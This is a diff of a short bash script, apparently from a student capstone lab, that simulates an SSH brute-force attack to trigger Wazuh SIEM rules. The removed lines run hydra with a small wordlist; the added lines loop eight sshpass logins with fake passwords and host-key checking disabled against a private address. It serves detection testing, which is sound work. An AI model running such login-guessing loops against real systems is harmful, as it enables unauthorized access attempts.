@@ -1,24 +1,13 @@
-#!/bin/bash
 # --- CAPSTONE ATTACK SCRIPT: RULE 5763 / 5712 (SSH BRUTEFORCE) ---
 
-TARGET="172.16.16.100"
-USER="wazuhadmin"
+#!/bin/bash
+TARGET="192.168.202.142"
+USER="admin"
 
-echo "Simulating SSH Brute Force attack on $TARGET..."
-
-# EXPLANATION: Gagawa ng local dictionary file na may isang tamang user pero puro maling password
-echo -e "password123\nadmin123\nroot123\nqwerty\nletmein123\ncapstone2026\nwrongpass1\nwrongpass2\nwazuhadmin" > fake_passwords.txt
-
-# Automatic installation fallback kung sakaling wala pa ang tool
-if ! command -v hydra &> /dev/null; then
-    echo "Hydra not found. Installing..."
-    sudo apt-get update && sudo apt-get install hydra -y
-fi
-
-# EXPLANATION:
-# -l $USER: Single valid username ang aatakihin
-# -P fake_passwords.txt: Gagamitin ang wordlist na ginawa natin sa taas
-# -t 4: Gagamit ng 4 concurrent threads para bumaha ang logs nang wala pang isang segundo
-hydra -l $USER -P fake_passwords.txt ssh://$TARGET -t 4
-
-echo "Attack complete. Check active-responses.log for SSH blocking!"
+echo "Initiating SSH Brute-Force Attack on $TARGET as external threat..."
+for i in {1..8}; do
+    echo "Attempt $i with fake password..."
+    sshpass -p "HackedPass123!_$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $USER@$TARGET 2>/dev/null
+    sleep 1
+done
+echo "Attack simulation complete! Check Wazuh SIEM for Rules 5712, 5720, and 5763."
